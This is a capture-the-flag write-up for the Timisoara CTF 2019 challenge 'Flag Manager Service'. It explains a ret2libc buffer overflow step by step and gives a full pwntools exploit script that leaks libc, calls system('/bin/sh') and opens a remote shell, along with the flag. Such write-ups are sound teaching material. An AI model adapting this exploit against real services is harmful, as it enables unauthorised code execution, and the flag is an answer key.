---
title: "Flag Manager Service [400]"
tags: [Timisoara CTF, Binary Exploitation]
excerpt: "Binary Exploitation"
layout: single
classes: wide
--- 

**Category:** Binary Exploitation 

> Our spies found this flag manager service running on the ctf server. It needs a password tho, but I am sure you can handle it.  
nc 89.38.208.144 11115

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Flag%20Manager%20Service%20%5B400%5D){: .btn .btn--primary}

## Write-up
Analysis of the binary with Ghidra shows this is a standard ret2libc buffer overflow. `libc-2.27.so` being provided reinforces the challenge being a ret2libc.

As usual, all ret2libc exploits have the following order:
1. **Leak the address of puts**  
Leak the address of `puts` using `puts` to output the address. Essentially, just call `puts(puts_got)`, where `puts_got` is the address of `puts`in the `GLOBAL OFFSET TABLE (GOT)`.

2. **Calculate the libc base**  
Libc base can be calculated using `puts` - `puts_offset`, where `puts` is the leaked address and `puts_offset` is the address of `puts` in libc. 

3. **Calculate system and /bin/sh address**    
With libc base value, the address of `system` and the string `/bin/sh\x00` can be calculated using `libc_base + system_offset` and `libc_base + binsh_offset` respectively.

4. **Call system(/bin/sh)**  
Overflow the buffer and call `system(/bin/sh)`, which executes shell. Before calling `system(/bin/sh)`, the `RSI` register has to be set to 0, or the call will not work.

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./flag_manager01",
    "libc" : "./libc-2.27.so",
    "ld" : "./ld-2.27.so",
    "HOST" : "89.38.208.144",
    "PORT" : 11115,
}

def exploit(p):
	padding = "\x90"*88
	main = elf.symbols['main']
	puts_got = elf.got['puts']
	puts_plt = elf.plt['puts']

	pop_rdi = elf.search(asm("pop rdi ; ret")).next()
	pop_rsi_r15 = elf.search(asm("pop rsi ; pop r15 ; ret")).next()

	payload = padding 
	payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
	sla("Enter your name: ", payload)
	sla("Enter password please: ", '') 

	p.recvline()
	p.recvline()

	puts = u64(p.recvline().strip() + '\x00'*2)
	base = puts - libc.symbols['puts']
	system = base + libc.symbols['system']
	sh = base + libc.search("/bin/sh\x00").next()

	payload = padding + p64(pop_rdi) + p64(sh) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(system)

	sla("Enter your name: ", payload)
	sla("Enter password please: ", '')
	 
	lg("SYSTEM: " + hex(system))
	lg("BASE: " + hex(base))
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** TIMCTF{d3v_fd_i5_sn3aky_backd00r}
